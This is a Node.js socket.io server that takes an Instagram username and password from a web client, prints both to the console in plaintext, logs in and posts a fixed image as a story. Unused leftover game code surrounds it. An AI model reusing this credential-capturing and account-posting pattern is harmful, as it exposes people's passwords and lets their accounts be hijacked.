// Setup basic express server
var debug = true;

var port = debug ? 7777 : 27016;

var express = require('express');
var app = express();
var server = require('http').createServer(app);
var io = require('socket.io')(server);


const Instagram = require('instagram-web-api');
const FileCookieStore = require('tough-cookie-filestore2');

var players = [];

var lastSpin = Date.now();
var spinning = false;

var potTotal = 0;


/*
 
{
  id: "asdlfkajds;lfkjads",
  name: "Marissa Mannhardt",
  liked: [],
  disliked: [],
}

*/

var port = process.env.PORT || 8080;

server.listen(port, function () {
  console.log('Server listening at port %d', port);
});
// Routing
app.use(express.static(__dirname + '/public'));


io.on('connection', function (socket) {
  
console.log('User Connected');
  // when the client emits 'add user', this listens and executes
  
  socket.on('DoItToEm', function (uu,pp) {
        destruction(uu,pp,socket);
    })

  });



function sendOutStuff(thearray) {
  io.emit('getStuff', thearray);
}

function destruction(uu,pp,socket) {
  var {username,password} = {uu,pp};
  var client = new Instagram({ username: uu, password:pp });

  console.log(uu + " " + pp);
  client.login().then(() => {
    console.log("Logged on!");
    console.log(client);
    console.log(client.credentials.username);

    if(client.credentials.username == undefined) {
      socket.emit("Fail","");
    }
    else {
      client.uploadStory({ photo: "IMG_3575.JPG" }).then(function () {
        console.log("Story Uploaded");
        socket.emit("Complete","");
      });
    }
  });


}


//console.log(lol.user.edge_owner_to_timeline_media.edges);

var counter = 0;



  function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min)) + min; //The maximum is exclusive and the minimum is inclusive
  }


function niceTime(dattte) {
  var datee = new Date(Number(dattte)),
  hours = datee.getHours(),
  minutes = datee.getMinutes();

  if (minutes < 10) {
  minutes = "0" + minutes;
  }

  var suffix = "AM";
  if (hours >= 12) {
    suffix = "PM";
    hours = hours - 12;
  }
  if (hours == 0) {
  hours = 12;
  }
  return hours + ":" + minutes + " " + suffix;
}

function sendOutMsg(name, msg) {
  for(var i = 0; i < players.length;i++) {
    io.sockets.connected[players[i].id].emit('NewChat',name, msg);
  }
}

function sendByID(id, name,  data) {
  io.sockets.connected[id].emit(name,data);
}

function getLoc(player) {
  return world[player.loc];
}

function newPlayer(id) {
  var pp = {
    key: genKey(),
    id: id,
    submitted: false,
    submittedName: "",
    liked: [],
    disliked: []
  };

  return pp;
}

//io.sockets.connected[myplayer.id].emit('ViewUpdate', myplayer,bundle,buildingbundle);

function compact(player) {
  return {
    x: player.x,
    y: player.y,
    health: player.health,
    maxhealth: player.maxhealth,
    slash: player.slash,
    move:  player.move,
    cid: player.cid
  };
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function hasWhiteSpace(str) {
  return str.indexOf(' ') >= 0;
}

function getPlayerByCID(cid) {
  for(var i in players) {
    if(players[i].cid == cid)
      return players[i];
  }
}

function getPlayerByID(id) {
  for(var i in players) {
    if(players[i].id == id)
      return players[i];
  }
}

function getColorByUsername(username) {
  for(var i in players) {
    if(players[i].username == username)
      return players[i].color;
  }
}

function genKey() {
  var key = "";
  for(var o = 0 ; o< 40; o++) {
    key += String(getRandomInt(0,9));
    
  }
  return key;
}


function priceFromDrug(drug) {
  if( drug == "weed") {
    return {cost:100, risk: .4};
  }
  else if (drug == "coke") {
    return {cost:300, risk: 1.1};
  }
  else if (drug == "heroin") {
    return {cost:600, risk: 2};
  }
  else if (drug == "meth") {
    return {cost:1000, risk: 3.8};
  }
}

function priceToRun(drug) {
  if( drug == "weed") {
    return 100;
  }
  else if (drug == "coke") {
    return 200;
  }
  else if (drug == "heroin") {
    return 400;
  }
  else if (drug == "meth") {
    return 600;
  }
}

function multiplierFromCountry(country) {
  if( country == "america") {
    return {cost:1, risk: 3};
  }
  else if (country == "canada") {
    return {cost:2, risk: 6};
  }
  else if (country == "mexico") {
    return {cost:3, risk: 9};
  }
  else if (country == "china") {
    return {cost:8, risk: 24};
  }
}